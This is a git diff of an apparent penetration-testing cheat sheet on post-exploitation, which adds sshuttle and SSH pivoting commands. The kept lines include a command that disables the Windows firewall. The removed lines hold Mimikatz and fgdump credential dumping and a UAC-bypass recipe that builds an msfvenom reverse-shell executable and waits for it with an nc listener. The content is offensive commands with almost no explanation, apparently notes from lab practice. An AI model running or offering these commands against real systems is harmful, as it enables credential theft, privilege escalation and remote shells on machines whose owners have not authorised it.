@@ -1,9 +1,8 @@
 # Post Exploitation
-* [Lateral Movement](#Lateral-movement)
-* [Dumping Credentials](#Dumping-credentials)
+* [Pivoting](#Pivoting)
 * [Misc](#Misc)
 
-## Lateral movement
+## Pivoting
 ### Local Port forwarding
 #### Port forwarding rinetd
 ```
@@ -61,22 +60,15 @@ socat tcp-l:<LISTENING PORT>,fork tcp:<TARGET IP TO SEND IT TO (FIRST HOP)>:<TAR
 ```
 
 ### Proxychains
-### Proxychains over hop
+#### Proxychains over hop
 ```
 ssh -J <USER>@<FIRST HOP IP> -D 127.0.0.1:9000 <USER>@<SECOND IP>
 ```
 
-## Dumping credentials
-#### Mimikatz.exe
-Bring over mimikatz.exe using an SMB server.
+### sshuttle
 ```
-mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full"
-```
-
-#### Fgdump.exe
-```
-fgdump.exe
-type .....pwdump
+sshuttle -r <USERNAME>@<TARGET> <RANGE(s) TO TUNNEL> --ssh-cmd 'ssh -i /home/user/Offshore/id_rsa_root_nix01'
+sshuttle -r <USERNAME>@<TARGET> <RANGE(s) TO TUNNEL>
 ```
 
 ## Misc
@@ -105,18 +97,4 @@ netsh advfirewall set allprofiles state off
 
 #RDP to machine
 xfreerdp /u:<USER> /p:<PASS> /v:<TARGET>
-```
-
-#### UAC bypass
-```
-msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe
-
-wget https://raw.githubusercontent.com/turbo/zero2hero/master/main.c
-#change
-	GetCurrentDirectory(MAX_PATH, curPath);
-	strcat(curPath, "\\shell.exe");
-
-x86_64-w64-mingw32-gcc main.c -o bypassuac.exe
-
-sudo nc -lnvp <PORT>
 ```
